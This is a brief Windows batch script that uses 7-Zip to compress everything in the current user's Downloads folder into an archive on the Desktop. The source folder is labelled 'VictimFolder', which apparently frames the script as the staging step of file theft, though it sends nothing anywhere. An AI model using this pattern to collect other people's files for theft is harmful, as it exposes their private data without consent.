@echo off

set "Desktop=%USERPROFILE%\Desktop"

set "VictimFolder=%USERPROFILE%\Downloads"


echo (7zip) Zipping files...

7z a "%Desktop%\%USERNAME%Files.zip" "%VictimFolder%\*"

echo Zip file created successfully!

